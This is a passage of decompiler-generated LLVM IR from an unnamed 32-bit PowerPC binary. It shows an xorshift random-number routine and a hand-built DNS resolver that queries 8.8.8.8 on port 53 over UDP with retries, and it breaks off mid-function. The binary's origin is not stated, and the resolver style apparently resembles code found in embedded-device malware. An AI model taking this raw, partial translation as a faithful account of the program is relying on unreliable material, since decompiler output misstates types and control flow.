  store i32 %v2_100065c8, i32* %v2_10006580, align 4
  %v0_10006584 = load i32, i32* @r4, align 4
  %v1_10006584 = add i32 %v0_10006584, -4
  store i32 %v1_10006584, i32* @r4, align 4
  %v0_10006588 = load i32, i32* @r3, align 4
  %v1_10006588 = add i32 %v0_10006588, 4
  br label %dec_label_pc_1000658c

dec_label_pc_1000658c:                            ; preds = %dec_label_pc_100065dc, %dec_label_pc_10006580
  %v0_1000658c = phi i32 [ %v0_1000658c.pr, %dec_label_pc_100065dc ], [ %v1_10006584, %dec_label_pc_10006580 ]
  %storemerge = phi i32 [ %v1_100065e0, %dec_label_pc_100065dc ], [ %v1_10006588, %dec_label_pc_10006580 ]
  store i32 %storemerge, i32* @r3, align 4
  %v0_10006590 = load i32, i32* %r6.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_1000658c, 1
  br i1 %tmp20, label %dec_label_pc_100065e8, label %dec_label_pc_10006598

dec_label_pc_10006598:                            ; preds = %dec_label_pc_1000658c
  %v0_10006598 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10006598, i32* %r6.global-to-local, align 4
  %v0_1000659c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000659c, i32* %r5.global-to-local, align 4
  %v0_100065a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_100065a0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100065a4

dec_label_pc_100065a4:                            ; preds = %dec_label_pc_1000655c, %dec_label_pc_10006598
  %v0_10006644 = phi i32 [ %v3_10006574, %dec_label_pc_1000655c ], [ %v0_10006598, %dec_label_pc_10006598 ]
  %v0_10006628 = phi i32 [ %v3_10006570, %dec_label_pc_1000655c ], [ %v0_1000659c, %dec_label_pc_10006598 ]
  %v0_1000662c = phi i32 [ %v3_1000656c, %dec_label_pc_1000655c ], [ %v0_100065a0, %dec_label_pc_10006598 ]
  %v0_1000660c = phi i32 [ %v3_10006578, %dec_label_pc_1000655c ], [ %v0_10006590, %dec_label_pc_10006598 ]
  %v0_100065d4 = phi i32 [ %v0_10006544, %dec_label_pc_1000655c ], [ %v0_1000658c, %dec_label_pc_10006598 ]
  %v2_100065a4 = icmp sgt i32 %v0_100065d4, 3
  %v1_100065a8 = mul i32 %v0_1000660c, 2048
  %v1_100065ac = udiv i32 %v0_1000662c, 524288
  %v2_100065b0 = xor i32 %v1_100065a8, %v0_1000660c
  %v2_100065b4 = xor i32 %v1_100065ac, %v0_1000662c
  %v2_100065bc = xor i32 %v2_100065b4, %v2_100065b0
  %v1_100065c0 = udiv i32 %v2_100065b0, 256
  %v2_100065c8 = xor i32 %v2_100065bc, %v1_100065c0
  store i32 %v2_100065c8, i32* %r0.global-to-local, align 4
  br i1 %v2_100065a4, label %dec_label_pc_10006580, label %dec_label_pc_100065d0

dec_label_pc_100065d0:                            ; preds = %dec_label_pc_100065a4
  %v3_100065b8 = icmp eq i32 %v0_100065d4, 1
  store i32 %v2_100065c8, i32* %r0.global-to-local, align 4
  %v1_100065d4 = add i32 %v0_100065d4, -2
  store i32 %v1_100065d4, i32* @r4, align 4
  br i1 %v3_100065b8, label %dec_label_pc_1000660c, label %dec_label_pc_100065dc

dec_label_pc_100065dc:                            ; preds = %dec_label_pc_100065d0
  %v1_100065dc = trunc i32 %v2_100065c8 to i16
  %v2_100065dc = load i32, i32* @r3, align 4
  %v3_100065dc = inttoptr i32 %v2_100065dc to i16*
  store i16 %v1_100065dc, i16* %v3_100065dc, align 2
  %v0_100065e0 = load i32, i32* @r3, align 4
  %v1_100065e0 = add i32 %v0_100065e0, 2
  %v0_1000658c.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000658c

dec_label_pc_100065e8:                            ; preds = %dec_label_pc_1000658c
  %v0_100065e8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_100065e8, i32* @global_var_1001b300.145, align 4
  %v0_100065ec = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_100065ec, i32* @global_var_1001b2fc.147, align 4
  %v0_100065f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_100065f0, i32* @global_var_1001b2f8.148, align 4
  store i32 %v0_10006590, i32* @global_var_1001b2f4.146, align 4
  br label %dec_label_pc_100065f8

dec_label_pc_100065f8:                            ; preds = %dec_label_pc_10006544.dec_label_pc_100065f8_crit_edge, %dec_label_pc_100065e8
  %v0_10006608 = phi i32 [ %v0_10006608.pre, %dec_label_pc_10006544.dec_label_pc_100065f8_crit_edge ], [ %storemerge, %dec_label_pc_100065e8 ]
  ret i32 %v0_10006608

dec_label_pc_1000660c:                            ; preds = %dec_label_pc_100065d0
  store i32 %v2_100065c8, i32* %r0.global-to-local, align 4
  store i32 %v0_10006628, i32* @global_var_1001b2f8.148, align 4
  store i32 %v0_1000662c, i32* @global_var_1001b2fc.147, align 4
  store i32 %v2_100065c8, i32* @global_var_1001b300.145, align 4
  store i32 %v0_10006644, i32* @global_var_1001b2f4.146, align 4
  %v1_10006648 = trunc i32 %v2_100065c8 to i8
  %v2_10006648 = load i32, i32* @r3, align 4
  %v3_10006648 = inttoptr i32 %v2_10006648 to i8*
  store i8 %v1_10006648, i8* %v3_10006648, align 1
  %v0_1000664c = load i32, i32* @r3, align 4
  ret i32 %v0_1000664c

; uselistorder directives
  uselistorder i32 %v2_100065c8, { 2, 1, 0, 3, 4, 6, 5 }
  uselistorder i32 %v0_1000660c, { 1, 0 }
  uselistorder i32 %v0_1000662c, { 1, 2, 0 }
  uselistorder i32 %v0_10006544, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_100065f8, { 1, 0 }
  uselistorder label %dec_label_pc_100065a4, { 1, 0 }
}

define i32 @function_10006650(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10006650:
  store i32 %arg1, i32* @r31, align 4
  %v3_1000665c = icmp eq i32 %arg1, 0
  br i1 %v3_1000665c, label %dec_label_pc_10006680, label %dec_label_pc_10006668

dec_label_pc_10006668:                            ; preds = %dec_label_pc_10006650
  %v1_10006668 = add i32 %arg1, 4
  %v2_10006668 = inttoptr i32 %v1_10006668 to i32*
  %v3_10006668 = load i32, i32* %v2_10006668, align 4
  store i32 %v3_10006668, i32* @r3, align 4
  %v3_1000666c = icmp eq i32 %v3_10006668, 0
  br i1 %v3_1000666c, label %dec_label_pc_10006678, label %dec_label_pc_10006674

dec_label_pc_10006674:                            ; preds = %dec_label_pc_10006668
  store i32 268461688, i32* @lr, align 4
  %v0_10006674 = call i32 @function_10008f30()
  %v0_10006678.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006678

dec_label_pc_10006678:                            ; preds = %dec_label_pc_10006668, %dec_label_pc_10006674
  %v0_10006678 = phi i32 [ %arg1, %dec_label_pc_10006668 ], [ %v0_10006678.pre, %dec_label_pc_10006674 ]
  store i32 %v0_10006678, i32* @r3, align 4
  store i32 268461696, i32* @lr, align 4
  %v0_1000667c = call i32 @function_10008f30()
  br label %dec_label_pc_10006680

dec_label_pc_10006680:                            ; preds = %dec_label_pc_10006650, %dec_label_pc_10006678
  %v0_10006690 = phi i32 [ 0, %dec_label_pc_10006650 ], [ %v0_1000667c, %dec_label_pc_10006678 ]
  ret i32 %v0_10006690

; uselistorder directives
  uselistorder i32 %arg1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10006680, { 1, 0 }
  uselistorder label %dec_label_pc_10006678, { 1, 0 }
}

define i32 @function_10006694(i32 %arg1) local_unnamed_addr {
dec_label_pc_10006694:
  %cr4_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp60 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-4308 = alloca i32, align 4
  %stack_var_-4312 = alloca i32, align 4
  %stack_var_-2096 = alloca i32, align 4
  %stack_var_-2108 = alloca i16, align 2
  %stack_var_-4284 = alloca i32, align 4
  %stack_var_-4300 = alloca i32, align 4
  %stack_var_-4143 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %stack_var_-4156 = alloca i32, align 4
  %v0_10006698 = load i32, i32* @lr, align 4
  store i32 %v0_10006698, i32* %r0.global-to-local, align 4
  %v0_1000669c = call i32 @__asm_mfcr()
  %v0_100066a4 = load i32, i32* @r29, align 4
  store i32 %v0_1000669c, i32* @r29, align 4
  %v2_100066b8 = ptrtoint i32* %stack_var_-4156 to i32
  %v2_100066c0 = ptrtoint i32* %stack_var_-4144 to i32
  store i32 %v2_100066c0, i32* %r26.global-to-local, align 4
  %v0_100066c4 = load i32, i32* %r0.global-to-local, align 4
  %v0_100066e4 = load i32, i32* @r28, align 4
  store i32 268461812, i32* @lr, align 4
  %v2_100066f0 = call i32 @function_10008ec0(i32 1, i32 8)
  store i32 %v2_100066f0, i32* %r25.global-to-local, align 4
  %v0_100066f8 = load i32, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006700.150 to i32), i32* @lr, align 4
  %v1_100066fc = inttoptr i32 %v0_100066f8 to i8*
  %v2_100066fc = call i32 @function_100074dc(i8* %v1_100066fc)
  %v2_10006700 = ptrtoint i32* %stack_var_-4143 to i32
  store i32 %v2_10006700, i32* %r10.global-to-local, align 4
  %v1_10006704 = add i32 %v2_100066fc, 1
  store i32 %v2_100066c0, i32* %r7.global-to-local, align 4
  %v1_10006710 = add i32 %v2_100066fc, 2
  store i32 %v1_10006710, i32* %ctr.global-to-local, align 4
  %tmp94 = icmp sgt i32 %v1_10006704, -1
  br i1 %tmp94, label %dec_label_pc_10006738.preheader, label %dec_label_pc_10006738.preheader.thread

dec_label_pc_10006738.preheader:                  ; preds = %dec_label_pc_10006694
  %v3_1000670c = icmp eq i32 %v1_10006704, 0
  %v1_1000673813 = or i32 %v2_10006700, 1
  store i32 %v1_1000673813, i32* %r11.global-to-local, align 4
  store i32 %v1_10006704, i32* %ctr.global-to-local, align 4
  br i1 %v3_1000670c, label %dec_label_pc_10006768, label %dec_label_pc_10006740.lr.ph

dec_label_pc_10006740.lr.ph:                      ; preds = %dec_label_pc_10006738.preheader
  %v0_10006740.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10006740

dec_label_pc_10006724:                            ; preds = %dec_label_pc_10006750
  %v3_10006724 = inttoptr i32 %v2_10006724 to i8*
  store i8 %v2_10006740, i8* %v3_10006724, align 1
  %v0_10006728 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006728 = urem i32 %v0_10006728, 256
  %v0_1000672c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000672c = add i32 %v0_1000672c, 1
  store i32 %v1_1000672c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006730

dec_label_pc_10006730:                            ; preds = %dec_label_pc_10006758, %dec_label_pc_10006724
  %v0_10006734 = phi i32 [ %v0_10006734.pre, %dec_label_pc_10006758 ], [ %v1_1000672c, %dec_label_pc_10006724 ]
  %v0_1000675020 = phi i32 [ 0, %dec_label_pc_10006758 ], [ %v1_10006728, %dec_label_pc_10006724 ]
  %v0_10006730 = load i32, i32* @r29, align 4
  %v1_10006730 = add i32 %v0_10006730, 1
  store i32 %v1_10006730, i32* @r29, align 4
  store i32 %v0_10006734, i32* %r10.global-to-local, align 4
  %v1_10006738 = add i32 %v0_10006734, 1
  store i32 %v1_10006738, i32* %r11.global-to-local, align 4
  %v0_1000673c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000673c = add i32 %v0_1000673c, -1
  store i32 %v1_1000673c, i32* %ctr.global-to-local, align 4
  %v2_1000673c = icmp eq i32 %v1_1000673c, 0
  br i1 %v2_1000673c, label %dec_label_pc_10006768, label %dec_label_pc_10006740

dec_label_pc_10006740:                            ; preds = %dec_label_pc_10006740.lr.ph, %dec_label_pc_10006730
  %v2_10006724 = phi i32 [ %v2_10006700, %dec_label_pc_10006740.lr.ph ], [ %v0_10006734, %dec_label_pc_10006730 ]
  %v0_10006758 = phi i32 [ 0, %dec_label_pc_10006740.lr.ph ], [ %v0_1000675020, %dec_label_pc_10006730 ]
  %v0_10006740 = phi i32 [ %v0_10006740.pre, %dec_label_pc_10006740.lr.ph ], [ %v1_10006730, %dec_label_pc_10006730 ]
  %v1_10006740 = inttoptr i32 %v0_10006740 to i8*
  %v2_10006740 = load i8, i8* %v1_10006740, align 1
  %v3_10006740 = zext i8 %v2_10006740 to i32
  store i32 %v3_10006740, i32* %r0.global-to-local, align 4
  %v3_10006744 = icmp eq i8 %v2_10006740, 46
  br i1 %v3_10006744, label %dec_label_pc_10006758, label %dec_label_pc_10006750

dec_label_pc_10006750:                            ; preds = %dec_label_pc_10006740
  %v3_10006748 = icmp eq i8 %v2_10006740, 0
  %v1_10006750 = add nsw i32 %v0_10006758, 1
  store i32 %v1_10006750, i32* %r9.global-to-local, align 4
  br i1 %v3_10006748, label %dec_label_pc_10006758, label %dec_label_pc_10006724

dec_label_pc_10006758:                            ; preds = %dec_label_pc_10006750, %dec_label_pc_10006740
  %v1_10006758 = trunc i32 %v0_10006758 to i8
  %v2_10006758 = load i32, i32* %r7.global-to-local, align 4
  %v3_10006758 = inttoptr i32 %v2_10006758 to i8*
  store i8 %v1_10006758, i8* %v3_10006758, align 1
  %v0_1000675c = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000675c, i32* %r7.global-to-local, align 4
  %v0_10006734.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006730

dec_label_pc_10006768:                            ; preds = %dec_label_pc_10006730, %dec_label_pc_10006738.preheader.thread, %dec_label_pc_10006738.preheader
  %v2_10006770 = phi i32 [ %v2_10006700, %dec_label_pc_10006738.preheader ], [ %v2_10006700, %dec_label_pc_10006738.preheader.thread ], [ %v0_10006734, %dec_label_pc_10006730 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10006770 = inttoptr i32 %v2_10006770 to i8*
  store i8 0, i8* %v3_10006770, align 1
  %v2_10006774 = ptrtoint i32* %stack_var_-4300 to i32
  store i32 -1, i32* @r30, align 4
  store i32 1, i32* %r27.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10006784.151 to i32), i32* @lr, align 4
  %v1_10006780 = bitcast i32* %stack_var_-4144 to i8*
  %v2_10006780 = call i32 @function_100074dc(i8* %v1_10006780)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10006788 = load i32, i32* %r26.global-to-local, align 4
  %v2_10006788 = add i32 %v0_10006788, %v2_10006780
  store i32 %v2_10006788, i32* %r29.global-to-local, align 4
  %v0_10006794 = load i32, i32* @r30, align 4
  %v3_10006794 = icmp eq i32 %v0_10006794, -1
  store i1 %v3_10006794, i1* %cr4_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-4300, align 4
  %v2_1000679c = ptrtoint i32* %stack_var_-4284 to i32
  store i32 %v2_1000679c, i32* @r31, align 4
  %v2_100067a4 = ptrtoint i16* %stack_var_-2108 to i32
  store i32 %v2_100067a4, i32* %r19.global-to-local, align 4
  store i32 268462000, i32* @lr, align 4
  %v2_100067ac = call i32 @function_100074dc(i8* %v1_10006780)
  %v1_100067b0 = add i32 %v2_100067ac, 17
  store i32 %v1_100067b0, i32* %r23.global-to-local, align 4
  %v0_100067b4 = call i32 @function_10006318()
  %v1_100067b4 = sext i32 %v0_100067b4 to i64
  store i32 16, i32* @r4, align 4
  %v5_100067c8 = mul nuw nsw i64 %v1_100067b4, 2147516417
  store i32 %v2_10006774, i32* @r3, align 4
  %v2_100067d0 = ptrtoint i32* %stack_var_-2096 to i32
  store i32 %v2_100067d0, i32* %r20.global-to-local, align 4
  %v1_100067d42 = udiv i64 %v5_100067c8, 140737488355328
  %v1_100067d4 = trunc i64 %v1_100067d42 to i32
  store i32 %v1_100067d4, i32* %r0.global-to-local, align 4
  %v2_100067d8 = add i32 %v1_100067d4, %v0_100067b4
  store i32 %v2_100067d8, i32* %r9.global-to-local, align 4
  %v1_100067dc = urem i32 %v2_100067d8, 65536
  store i32 %v1_100067dc, i32* %r22.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100067e4.153 to i32), i32* @lr, align 4
  %v0_100067e0 = call i32 @function_10007584()
  store i32 2, i32* %stack_var_-4300, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  store i32 134744072, i32* %r11.global-to-local, align 4
  %v0_100067f8 = load i32, i32* %r29.global-to-local, align 4
  store i32 53, i32* %r9.global-to-local, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v0_10006810 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10006810, i32* %stack_var_-4156, align 4
  %v3_10006818 = add i32 %v0_100067f8, 3
  %v4_10006818 = inttoptr i32 %v3_10006818 to i16*
  store i16 1, i16* %v4_10006818, align 2
  %v0_1000681c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000681c = trunc i32 %v0_1000681c to i16
  %v2_1000681c = load i32, i32* %r29.global-to-local, align 4
  %v3_1000681c = add i32 %v2_1000681c, 1
  %v4_1000681c = inttoptr i32 %v3_1000681c to i16*
  store i16 %v1_1000681c, i16* %v4_1000681c, align 2
  %v2_100068c0 = ptrtoint i32* %stack_var_-4312 to i32
  %v2_100068f4 = ptrtoint i32* %stack_var_-4308 to i32
  %v1_100069e4 = bitcast i32* %stack_var_-2096 to i8*
  %v4_100069fc = zext i16 %tmp60 to i32
  %v3_10006a00 = icmp eq i16 %tmp60, 0
  br label %dec_label_pc_10006820

dec_label_pc_10006820:                            ; preds = %dec_label_pc_10006960, %dec_label_pc_10006768
  %v0_10006820 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10006820, label %dec_label_pc_1000682c, label %dec_label_pc_10006824

dec_label_pc_10006824:                            ; preds = %dec_label_pc_10006820
  store i32 ptrtoint ([3 x i8]* @global_var_1000682c.154 to i32), i32* @lr, align 4
  %v0_10006828 = call i32 @function_10007d68()
  br label %dec_label_pc_1000682c

dec_label_pc_1000682c:                            ; preds = %dec_label_pc_10006820, %dec_label_pc_10006824
  store i32 268462140, i32* @lr, align 4
  %v3_10006838 = call i32 @function_10008b34(i32 2, i32 2, i32 0)
  store i32 %v3_10006838, i32* @r3, align 4
  %v3_1000683c = icmp eq i32 %v3_10006838, -1
  store i1 %v3_1000683c, i1* %cr4_eq.global-to-local, align 1
  store i32 %v3_10006838, i32* @r30, align 4
  br i1 %v3_1000683c, label %dec_label_pc_10006968, label %dec_label_pc_10006848

dec_label_pc_10006848:                            ; preds = %dec_label_pc_1000682c
  store i32 268462164, i32* @lr, align 4
  %v0_10006850 = call i32 @function_10008934()
  %v3_10006854 = icmp eq i32 %v0_10006850, -1
  br i1 %v3_10006854, label %dec_label_pc_10006968, label %dec_label_pc_1000685c

dec_label_pc_1000685c:                            ; preds = %dec_label_pc_10006848
  %v0_1000685c = load i32, i32* @r30, align 4
  %v0_10006864 = load i32, i32* %r23.global-to-local, align 4
  store i32 268462192, i32* @lr, align 4
  %v4_1000686c = call i32 @function_10008a80(i32 %v0_1000685c, i32 %v2_100066b8, i32 %v0_10006864, i32 16384)
  %v3_10006870 = icmp eq i32 %v4_1000686c, -1
  br i1 %v3_10006870, label %dec_label_pc_10006968, label %dec_label_pc_10006878

dec_label_pc_10006878:                            ; preds = %dec_label_pc_1000685c
  %v0_10006878 = load i32, i32* @r30, align 4
  store i32 %v0_10006878, i32* @r4, align 4
  store i32 268462220, i32* @lr, align 4
  %v2_10006888 = call i32 @function_10007c38(i32 3)
  %v0_1000688c = load i32, i32* @r30, align 4
  store i32 %v0_1000688c, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_100068a0.155 to i32), i32* @lr, align 4
  %v2_1000689c = call i32 @function_10007c38(i32 4)
  store i32 32, i32* %r0.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_100068b0141 = load i32, i32* @r31, align 4
  %v4_100068b0143 = inttoptr i32 %v2_100068b0141 to i32*
  store i32 0, i32* %v4_100068b0143, align 4
  %v0_100068b4144 = load i32, i32* %r9.global-to-local, align 4
  %v1_100068b4145 = add i32 %v0_100068b4144, 4
  store i32 %v1_100068b4145, i32* %r9.global-to-local, align 4
  %v0_100068b8146 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100068b8147 = add i32 %v0_100068b8146, -1
  store i32 %v1_100068b8147, i32* %ctr.global-to-local, align 4
  %v2_100068b8148 = icmp eq i32 %v1_100068b8147, 0
  br i1 %v2_100068b8148, label %dec_label_pc_100068bc, label %dec_label_pc_100068b0.dec_label_pc_100068b0_crit_edge

dec_label_pc_100068b0.dec_label_pc_100068b0_crit_edge: ; preds = %dec_label_pc_10006878, %dec_label_pc_100068b0.dec_label_pc_100068b0_crit_edge
  %v1_100068b4149 = phi i32 [ %v1_100068b4, %dec_label_pc_100068b0.dec_label_pc_100068b0_crit_edge ], [ %v1_100068b4145, %dec_label_pc_10006878 ]
  %v0_100068b0.pre = load i32, i32* %r11.global-to-local, align 4
  %v2_100068b0 = load i32, i32* @r31, align 4
  %v3_100068b0 = add i32 %v2_100068b0, %v1_100068b4149
  %v4_100068b0 = inttoptr i32 %v3_100068b0 to i32*
  store i32 %v0_100068b0.pre, i32* %v4_100068b0, align 4
  %v0_100068b4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100068b4 = add i32 %v0_100068b4, 4
  store i32 %v1_100068b4, i32* %r9.global-to-local, align 4
  %v0_100068b8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100068b8 = add i32 %v0_100068b8, -1
  store i32 %v1_100068b8, i32* %ctr.global-to-local, align 4
  %v2_100068b8 = icmp eq i32 %v1_100068b8, 0
  br i1 %v2_100068b8, label %dec_label_pc_100068bc, label %dec_label_pc_100068b0.dec_label_pc_100068b0_crit_edge

dec_label_pc_100068bc:                            ; preds = %dec_label_pc_100068b0.dec_label_pc_100068b0_crit_edge, %dec_label_pc_10006878
  %v0_100068bc = load i32, i32* @r30, align 4
  %v1_100068bc = call i32 @__asm_rlwinm(i32 %v0_100068bc, i32 29, i32 3, i32 29)
  store i32 %v1_100068bc, i32* %r9.global-to-local, align 4
  store i32 %v2_100068c0, i32* %r0.global-to-local, align 4
  %v2_100068c4 = add i32 %v1_100068bc, %v2_100068c0
  store i32 %v2_100068c4, i32* %r29.global-to-local, align 4
  %v0_100068c8 = load i32, i32* @r30, align 4
  %v1_100068c8 = urem i32 %v0_100068c8, 32
  store i32 %v1_100068c8, i32* %r28.global-to-local, align 4
  %v1_100068cc = add i32 %v2_100068c4, 28
  %v2_100068cc = inttoptr i32 %v1_100068cc to i32*
  %v3_100068cc = load i32, i32* %v2_100068cc, align 4
  %v3_100068d4 = shl i32 1, %v1_100068c8
  %v1_100068d8 = add i32 %v0_100068c8, 1
  %v2_100068dc = or i32 %v3_100068d4, %v3_100068cc
  store i32 %v2_100068dc, i32* %r9.global-to-local, align 4
  store i32 %v2_100068dc, i32* %v2_100068cc, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 %v2_100068f4, i32* %r7.global-to-local, align 4
  store i32 5, i32* %stack_var_-4308, align 4
  store i32 268462340, i32* @lr, align 4
  %v6_10006900 = call i32 @function_10008030(i32 %v1_100068d8, i32 %v2_1000679c, i32 0, i32 0, i32 %v2_100068f4, i32 %v2_100068dc)
  %v3_10006904 = icmp eq i32 %v6_10006900, -1
  br i1 %v3_10006904, label %dec_label_pc_10006978, label %dec_label_pc_1000690c

dec_label_pc_1000690c:                            ; preds = %dec_label_pc_100068bc
  %v3_1000690c = icmp eq i32 %v6_10006900, 0
  br i1 %v3_1000690c, label %dec_label_pc_10006958, label %dec_label_pc_10006914

dec_label_pc_10006914:                            ; preds = %dec_label_pc_1000690c
  %v0_10006914 = load i32, i32* %r29.global-to-local, align 4
  %v1_10006914 = add i32 %v0_10006914, 28
  %v2_10006914 = inttoptr i32 %v1_10006914 to i32*
  %v3_10006914 = load i32, i32* %v2_10006914, align 4
  %v1_10006918 = load i32, i32* %r28.global-to-local, align 4
  %v2_10006918 = urem i32 %v1_10006918, 32
  %v3_10006918 = sub i32 0, %v1_10006918
  %v4_10006918 = urem i32 %v3_10006918, 32
  %v5_10006918 = shl i32 %v3_10006914, %v4_10006918
  %v6_10006918 = xor i32 %v4_10006918, 31
  %v7_10006918 = lshr i32 %v3_10006914, %v6_10006918
  %v8_10006918 = udiv i32 %v7_10006918, 2
  %v9_10006918 = or i32 %v8_10006918, %v5_10006918
  %v10_10006918 = and i32 %v1_10006918, 32
  %v11_10006918 = icmp ne i32 %v10_10006918, 0
  %v12_10006918 = lshr i32 -1, %v2_10006918
  %v13_10006918 = select i1 %v11_10006918, i32 0, i32 %v12_10006918
  %v14_10006918 = and i32 %v9_10006918, %v13_10006918
  %v15_10006918 = ashr i32 %v3_10006914, 31
  %v16_10006918 = sub i32 -1, %v13_10006918
  %v17_10006918 = and i32 %v15_10006918, %v16_10006918
  %v18_10006918 = or i32 %v14_10006918, %v17_10006918
  store i32 %v18_10006918, i32* %r0.global-to-local, align 4
  %v1_1000691c = urem i32 %v18_10006918, 2
  store i32 %v1_1000691c, i32* %r9.global-to-local, align 4
  %v3_1000691c = icmp eq i32 %v1_1000691c, 0
  br i1 %v3_1000691c, label %dec_label_pc_10006978, label %dec_label_pc_10006924

dec_label_pc_10006924:                            ; preds = %dec_label_pc_10006914
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_10006938 = load i32, i32* @r30, align 4
  store i32 268462400, i32* @lr, align 4
  %v6_1000693c = call i32 @function_10008a40(i32 %v0_10006938, i32 %v2_100067a4, i32 2048, i32 16384, i32 0, i32 0)
  store i32 %v6_1000693c, i32* %r29.global-to-local, align 4
  %v0_10006944 = load i32, i32* %r26.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000694c.156 to i32), i32* @lr, align 4
  %v1_10006948 = inttoptr i32 %v0_10006944 to i8*
  %v2_10006948 = call i32 @function_100074dc(i8* %v1_10006948)
  %v1_1000694c = add i32 %v2_10006948, 17
  %v2_10006950 = icmp ult i32 %v6_1000693c, %v1_1000694c
  br i1 %v2_10006950, label %dec_label_pc_10006958, label %dec_label_pc_100069dc

dec_label_pc_10006958:                            ; preds = %dec_label_pc_100069dc, %dec_label_pc_10006924, %dec_label_pc_100069fc, %dec_label_pc_1000690c
  %v0_10006958 = load i32, i32* %r27.global-to-local, align 4
  %v3_10006958 = icmp eq i32 %v0_10006958, 5
  br i1 %v3_10006958, label %dec_label_pc_10006978, label %dec_label_pc_10006960

dec_label_pc_10006960:                            ; preds = %dec_label_pc_10006968, %dec_label_pc_10006958
  %v0_10006960 = phi i32 [ %v0_10006970, %dec_label_pc_10006968 ], [ %v0_10006958, %dec_label_pc_10006958 ]
  %v1_10006960 = add i32 %v0_10006960, 1
  store i32 %v1_10006960, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10006820

dec_label_pc_10006968:                            ; preds = %dec_label_pc_1000685c, %dec_label_pc_10006848, %dec_label_pc_1000682c
  store i32 268462448, i32* @lr, align 4
  %v1_1000696c = call i32 @function_1000965c(i32 1)
  %v0_10006970 = load i32, i32* %r27.global-to-local, align 4
  %v3_10006970 = icmp eq i32 %v0_10006970, 5
  br i1 %v3_10006970, label %dec_label_pc_10006978, label %dec_label_pc_10006960

dec_label_pc_10006978:                            ; preds = %dec_label_pc_10006968, %dec_label_pc_10006958, %dec_label_pc_10006914, %dec_label_pc_100068bc, %dec_label_pc_10006a08.backedge, %dec_label_pc_10006a08.preheader
  store i32 268462464, i32* @lr, align 4
  %v0_1000697c = call i32 @function_10007d68()
  %v0_10006980 = load i32, i32* %r25.global-to-local, align 4
  %v1_10006980 = inttoptr i32 %v0_10006980 to i8*
  %v2_10006980 = load i8, i8* %v1_10006980, align 1
  %v3_10006980 = zext i8 %v2_10006980 to i32
  store i32 %v3_10006980, i32* %r0.global-to-local, align 4
  %v3_10006984 = icmp eq i8 %v2_10006980, 0
  br i1 %v3_10006984, label %dec_label_pc_10006af4, label %dec_label_pc_1000698c

dec_label_pc_1000698c:                            ; preds = %dec_label_pc_10006978, %dec_label_pc_10006b04
  %v0_10006990 = phi i32 [ %v0_10006980, %dec_label_pc_10006978 ], [ 0, %dec_label_pc_10006b04 ]
  store i32 %v0_100066c4, i32* %r0.global-to-local, align 4
  %v1_100069a4 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000669c)
  store i32 %v0_100066e4, i32* %r28.global-to-local, align 4
  store i32 %v0_100066a4, i32* %r29.global-to-local, align 4
  ret i32 %v0_10006990

dec_label_pc_100069dc:                            ; preds = %dec_label_pc_10006924
  store i32 %v2_100067d0, i32* %r26.global-to-local, align 4
  store i32 268462568, i32* @lr, align 4
  %v2_100069e4 = call i32 @function_100074dc(i8* %v1_100069e4)
  %v3_100069e8 = load i16, i16* %stack_var_-2108, align 2
  %v4_100069e8 = sext i16 %v3_100069e8 to i32
  store i32 %v4_100069e8, i32* %r0.global-to-local, align 4
